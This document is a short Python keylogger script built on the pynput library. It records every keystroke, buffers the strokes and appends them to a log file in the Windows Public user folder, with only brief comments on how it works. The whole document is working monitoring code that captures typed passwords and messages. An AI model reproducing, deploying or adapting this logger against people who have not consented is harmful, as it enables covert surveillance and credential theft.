from pynput.keyboard import Key, Listener
k=[]# The Buffer used to load key strokes and write them on file
file_path="c:\\Users\\Public\\logfile.txt"# Can specify the path of the log file to be saved
buff_len=10# Can change the desired length of the buffer to be checked before writing
with open (file_path,"a+") as f:
    f.write("\n\n----New Session---\n\n")
def on_press(key):
    global k
    print("{} pressed".format(key))
    if('Key.backspace'==str(key)):
        if(len(k)):
            k=k[:-1]
        else:
            with open (file_path,"a+") as f:
                f.write("<-")#Represents backspace stroke which was not handled
    else:
        k.append(str(key))
        if(len(k)>=buff_len):
            writing()
            print(k)
            k=[]
def on_release(key):
    if key==Key.esc:
        return
def writing():
    global k
    with open(file_path,"a+") as f:
        for x in k:
            x=x.replace("'","")
            if (x=='Key.space'):
                x=" "
            if (x=='Key.enter'):
                x="\n"
            f.write(x)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
